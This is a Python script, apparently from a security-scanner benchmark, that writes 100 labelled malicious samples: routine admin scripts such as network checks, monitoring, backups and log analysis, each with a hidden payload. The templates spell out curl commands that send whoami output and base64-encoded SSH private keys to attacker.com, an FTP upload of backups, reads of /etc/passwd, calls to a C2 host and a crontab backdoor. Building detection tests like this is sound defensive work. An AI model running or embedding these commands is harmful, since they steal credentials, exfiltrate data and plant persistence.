#!/usr/bin/env python3
"""
📝 False Prone 样本生成器
=======================
生成容易误报的恶意样本，用于测试扫描器的误报率控制

生成规则:
1. 包含常见安全工具的命令
2. 包含系统管理操作
3. 包含网络诊断命令
4. 但实际是恶意的 (有隐藏 payload)
"""

import os
from pathlib import Path
from datetime import datetime

OUTPUT_DIR = Path('/home/cdy/Desktop/security-benchmark/samples/from-templates/false_prone_generated')
SAMPLE_COUNT = 100  # 生成 100 个样本

# 恶意模式模板 (隐藏在日常命令中)
MALICIOUS_TEMPLATES = [
    # 1. 网络诊断 + 数据外传
    '''#!/bin/bash
# 网络诊断工具
ping -c 4 google.com
nslookup example.com
# 隐藏: 发送系统信息
curl -s http://attacker.com/collect?data=$(whoami | base64)
''',
    
    # 2. 系统监控 + 凭证窃取
    '''#!/bin/bash
# 系统监控脚本
top -b -n 1 | head -20
df -h
# 隐藏: 窃取 SSH 密钥
cat ~/.ssh/id_rsa | base64 | curl -X POST -d @- http://attacker.com/key
''',
    
    # 3. 日志分析 + 文件打包
    '''#!/bin/bash
# 日志分析
tail -100 /var/log/syslog
grep "error" /var/log/auth.log
# 隐藏: 打包敏感文件
tar czf /tmp/backup.tar.gz ~/.ssh ~/.gnupg 2>/dev/null
''',
    
    # 4. 备份脚本 + 数据外传
    '''#!/bin/bash
# 自动备份
BACKUP_DIR="/backup/$(date +%Y%m%d)"
mkdir -p $BACKUP_DIR
cp -r /home/* $BACKUP_DIR/
# 隐藏: 上传到外部
curl -T $BACKUP_DIR/*.tar.gz ftp://attacker.com/
''',
    
    # 5. Python 系统信息收集
    '''#!/usr/bin/env python3
"""系统信息收集工具"""
import os
import socket
import subprocess

print("系统信息:")
print(f"主机名：{socket.gethostname()}")
print(f"用户：{os.getlogin()}")
# 隐藏: 收集敏感信息
result = subprocess.run(['cat', '/etc/passwd'], capture_output=True)
print(result.stdout.decode()[:500])
''',
    
    # 6. Python 网络工具
    '''#!/usr/bin/env python3
"""网络连通性测试"""
import socket
import urllib.request

def check_host(host):
    try:
        response = urllib.request.urlopen(f'http://{host}')
        return True
    except:
        return False

print("检查网络连通性...")
check_host('google.com')
# 隐藏: 实际访问恶意 C2
check_host('attacker-c2-server.com')
''',
    
    # 7. 清理脚本 + 持久化
    '''#!/bin/bash
# 系统清理
rm -rf /tmp/*
rm -rf ~/.cache/*
# 隐藏: 添加持久化
echo "* * * * * /tmp/backdoor.sh" | crontab -
''',
    
    # 8. 性能监控 + 资源滥用
    '''#!/bin/bash
# 性能监控
while true; do
    echo "$(date): CPU=$(top -bn1 | grep 'Cpu(s)' | awk '{print $2}')%"
    sleep 60
done
# 隐藏: 挖矿脚本
# (实际会启动隐藏的加密货币矿工)
''',
]

def generate_sample(index: int, template: str) -> tuple:
    """生成单个样本"""
    sample_id = f"MAL-FP-{index:06x}"
    
    content = f'''# False Prone Sample - {sample_id}
# 类型：容易误报的恶意样本
# 生成时间：{datetime.now().isoformat()}
# 特征：包含常见系统管理命令，但隐藏恶意行为

{template}
'''
    
    return sample_id, content

def main():
    """主函数"""
    print("📝 生成 False Prone 恶意样本...")
    print(f"输出目录：{OUTPUT_DIR}")
    print(f"生成数量：{SAMPLE_COUNT} 个")
    print()
    
    # 创建输出目录
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    
    count = 0
    for i in range(SAMPLE_COUNT):
        template = MALICIOUS_TEMPLATES[i % len(MALICIOUS_TEMPLATES)]
        sample_id, content = generate_sample(i, template)
        
        # 创建样本目录
        sample_dir = OUTPUT_DIR / sample_id
        sample_dir.mkdir(exist_ok=True)
        
        # 写入 payload 文件
        payload_file = sample_dir / 'payload.bash'
        if 'python' in template.lower():
            payload_file = sample_dir / 'payload.py'
        
        with open(payload_file, 'w', encoding='utf-8') as f:
            f.write(content)
        
        # 写入 metadata
        metadata = {
            'id': sample_id,
            'attack_type': 'false_prone',
            'is_malicious': True,
            'description': '容易误报的恶意样本',
            'generated_at': datetime.now().isoformat()
        }
        
        with open(sample_dir / 'metadata.json', 'w', encoding='utf-8') as f:
            import json
            json.dump(metadata, f, indent=2, ensure_ascii=False)
        
        count += 1
        if count % 20 == 0:
            print(f"  已生成：{count}/{SAMPLE_COUNT}")
    
    print()
    print(f"✅ 生成完成：{count} 个样本")
    print(f"📁 输出目录：{OUTPUT_DIR}")

if __name__ == '__main__':
    main()
